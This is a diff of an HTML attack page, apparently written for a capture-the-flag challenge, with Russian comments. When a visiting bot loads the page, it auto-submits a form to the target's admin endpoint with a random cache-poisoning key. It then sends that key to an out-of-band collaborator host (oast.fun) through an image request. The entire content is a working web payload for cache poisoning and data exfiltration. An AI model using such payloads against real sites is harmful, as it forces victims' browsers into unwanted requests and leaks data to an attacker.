@@ -1,27 +1,21 @@
 <!DOCTYPE html>
+<form id="cacheForm" method="GET" action="https://tasks.goidactf.ru:20431/admin" target="_blank">
+    <input type="hidden" name="cache_key" value="cache_poison_<RANDOM>">
+</form>
+
 <script>
-const TARGET = 'https://tasks.goidactf.ru:20431';
-const CACHE_KEY = 'cache_poison_' + Math.random().toString(36).substr(2);
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// 1. Бот посещает админку с уникальным параметром через форму
-const form = document.createElement('form');
-form.method = 'GET';
-form.action = TARGET + '/admin?' + CACHE_KEY;
-form.target = '_blank';
-form.innerHTML = '<input type="hidden" name="cache_key" value="' + CACHE_KEY + '">';
-document.body.appendChild(form);
-form.submit();
+// Генерируем случайный ключ
+const cacheKey = 'cache_poison_' + Math.random().toString(36).substr(2, 10);
 
-// 2. Отправляем ключ через Image (без CORS)
-new Image().src = COLLAB + '/?cache_key=' + CACHE_KEY;
+// Устанавливаем значение в форме
+document.getElementById('cacheForm').action = 
+    'https://tasks.goidactf.ru:20431/admin?cache_key=' + cacheKey;
 
-// 3. Также пробуем POST запрос с параметром
-const postForm = document.createElement('form');
-postForm.method = 'POST';
-postForm.action = TARGET + '/admin?' + CACHE_KEY + '&method=post';
-postForm.target = '_blank';
-postForm.innerHTML = '<input type="hidden" name="test" value="post_cache">';
-document.body.appendChild(postForm);
-postForm.submit();
+// Отправляем форму
+document.getElementById('cacheForm').submit();
+
+// Отправляем ключ себе
+new Image().src = COLLAB + '/?key=' + cacheKey;
 </script>
